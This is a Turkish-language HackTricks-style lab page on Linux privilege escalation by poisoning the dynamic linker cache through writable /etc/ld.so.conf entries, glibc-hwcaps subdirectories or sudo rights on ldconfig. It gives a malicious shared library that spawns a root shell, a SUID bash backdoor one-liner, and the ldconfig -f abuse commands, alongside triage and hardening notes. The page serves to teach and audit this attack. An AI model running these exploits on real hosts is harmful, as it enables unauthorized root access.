# ld.so privesc exploit örneği

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **`/etc/ld.so.conf` veya `ldconfig` üzerinden system linker cache poisoning** için hazırlanmış odaklı bir lab ortamıdır. Eksik library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` ve diğer generic SUID linker abuse yöntemleri için [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) sayfasına bakın.

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Aynı klasörde bu dosyaları **oluşturun**
2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` konumuna **kopyalayın** ve cache'i yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_ dosyasının _/usr/lib_ konumundan **yüklenip yüklenmediğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Kullanışlı triage komutları

Gerçek bir hedefe saldırırken, binary'nin ihtiyaç duyduğu **tam library adını**, loader'ın **şu anda neyi çözdüğünü** ve canlı cache'i değiştirmeden yapılandırılmış hangi yolların yazılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` yalnızca **trusted** bir executable üzerinde kullanın. Bazı uygulamalar veya alışılmadık ELF interpreter'ları, attacker-controlled code çalıştırmasına neden olabilir; `objdump -p ./file | grep NEEDED` doğrudan dependencies listesini güvenli şekilde gösterir. **trusted** bir target için, tespit edilen interpreter'ı `--list` ile çağırmak gerçek resolution sonucunu gösterir.<sup>[[4]](#references)</sup>

Birkaç yararlı gotcha:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü
redirection mevcut shell'iniz tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** içinde
`LD_LIBRARY_PATH`/`LD_PRELOAD` değerlerini yok sayar, ancak
`/etc/ld.so.conf` dosyasından gelen directory'ler hâlâ trusted loader configuration'ın
parçasıdır; dolayısıyla bu misconfiguration privileged program'ları yine etkileyebilir.<sup>[[1]](#references)</sup>
- `LD_DEBUG`, `/etc/suid-debug` mevcut olmadığı sürece secure-execution mode içinde
yok sayılır. Bu nedenle privileged execution'dan output beklemek yerine trace'i
eşdeğer bir non-SUID çalıştırmadan toplayın.<sup>[[1]](#references)</sup>
- Daha yeni glibc sürümlerinde dynamic loader ayrıca
`--list-diagnostics` seçeneğini sunar. Bu seçenek, bir hijack beklenildiği gibi
davranmadığında cache resolution ve `glibc-hwcaps` subdirectory selection işlemlerinde
debugging için kullanışlıdır.<sup>[[1]](#references)</sup>

### Cache ve SONAME kısıtlamaları

`ldconfig`, configured bir directory'deki her arbitrary file'ı cache'lemez: ELF header'larını
inceler, `lib*.so*` veya `ld-*.so*` ile eşleşen isimleri tanır ve geleneksel
`libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` zincirini bekler. Bu nedenle inject edilen
object; target architecture/class'a, exact `DT_NEEDED` adına (normalde `DT_SONAME`) ve
victim'ın resolve ettiği tüm symbol/version'lara sahip olmalıdır.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Bu örnekteki gibi hedefe özgü bir kitaplığı tercih edin. Eksik bir nesneyle yaygın bir SONAME'i gölgelemek, amaçlanan ayrıcalıklı hedef çalışmadan önce onu çözen her işlemi bozabilir.<sup>[[3]](#references)</sup>

## Exploit

Bu senaryoda, **birinin** _/etc/ld.so.conf/_ içindeki bir dosyaya **güvenlik açığı içeren bir giriş eklediğini** varsayacağız:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Zafiyetli klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu yer) klasörüdür.\
Aşağıdaki kodu bu yolun içinde **indirin ve derleyin**:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir ayrıcalıklı hesabın) savunmasız binary'yi çalıştırmasını bekliyorsanız, genellikle etkileşimli bir shell başlatmak yerine **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı çalıştırma gerçekleştiğinde `/tmp/rootbash -p` komutunu kullanabilirsiniz.

Artık **kötü amaçlı libcustom kütüphanesini yanlış yapılandırılmış** yolun içine **oluşturduğumuza göre**, varsayılan önbellek başarılı bir ayrıcalıklı **`ldconfig`** çalıştırmasıyla yeniden oluşturulmalıdır. Yeniden başlatma yalnızca yerel önyükleme süreci bunu gerçekten çağırıyorsa yardımcı olur; aksi takdirde bir yöneticinin işlem yapmasını bekleyin veya mevcutsa güvenli olmayan bir sudo kuralı kullanın.<sup>[[2]](#references)</sup>

Bu gerçekleştiğinde, `sharedvuln` çalıştırılabilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz ayrıcalıkları yükseltmediğimizi unutmayın; ancak yürütülen komutları değiştirip **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi yürütmesini bekleyerek** ayrıcalıkları yükseltebiliriz.

### Modern `glibc-hwcaps` gölgelemesi

glibc 2.33'ten beri loader, **her kitaplık arama dizini** içindeki `glibc-hwcaps/<level>/` altında bulunan optimize edilmiş kitaplıkları tercih edebilir. Sonuç olarak yalnızca `/home/ubuntu/lib` dizinini kontrol etmek yeterli değildir: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` gibi yazılabilir ve uyumlu bir alt dizin, `ldconfig` bu dizini index'ledikten sonra temel kitaplığın önüne geçebilir; diğer CPU'lar ise temel objeyi kullanmaya devam eder. Bu durum ayrıca, doğrulama farklı bir CPU'da gerçekleştirildiğinde gözden kaçabilecek, mimariye özgü bir hijack sağlar.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
glibc hardening yönergeleri, yinelenen SONAME'lerden, varsayılan olmayan arama konumlarından ve `glibc-hwcaps` alt dizinlerindeki nesnelerden kaçınılmasını önerir. Audit açısından, yapılandırılmış dizinlere ve bunların üst yol bileşenlerine sahiplik ve yazılabilirlik kontrollerini recursive olarak uygulayın.<sup>[[3]](#references)</sup>

### Diğer yanlış yapılandırmalar - Aynı zafiyet

Önceki örnekte, bir yöneticinin **bir yapılandırma dosyası içinde, `/etc/ld.so.conf.d/` dizini içinde ayrıcalıksız bir klasör ayarladığı** bir yanlış yapılandırmayı taklit ettik.\
Ancak aynı zafiyete neden olabilecek başka yanlış yapılandırmalar da vardır: `/etc/ld.so.conf.d`s içindeki herhangi bir **yapılandırma dosyasında**, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında **yazma izinlerine** sahipseniz aynı zafiyeti yapılandırabilir ve exploit edebilirsiniz.

## Exploit 2

**`ldconfig` üzerinde sudo ayrıcalıklarına sahip olduğunuzu varsayalım**.\
`ldconfig`'e **conf dosyalarının nereden yükleneceğini belirtebilirsiniz**; böylece `ldconfig`'in rastgele klasörleri yüklemesini sağlayarak bundan yararlanabiliriz.<sup>[[2]](#references)</sup>\
Öyleyse `"/tmp"` dizinini yüklemek için gereken dosya ve klasörleri oluşturalım:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki exploit** bölümünde belirtildiği gibi, **kötü amaçlı kütüphaneyi `/tmp` içinde oluşturun**.\
Son olarak, path'i yükleyelim ve binary'nin library'yi nereden yüklediğini kontrol edelim:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olduğunuzda aynı güvenlik açığından yararlanabilirsiniz.** Kısıtlı bir sudo kuralını değerlendirirken seçenek ayrıntıları önemlidir: `-f` başka bir yapılandırma seçer, ancak yine de `/etc/ld.so.cache` dosyasını yeniden oluşturur; `-C` cache'i başka bir konuma yönlendirir; `-N` cache'in yeniden oluşturulmasını engeller; `-X` ise link güncellemelerini engeller, ancak **`-N` ile birlikte kullanılmadığı sürece cache'i yine de yeniden oluşturur**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
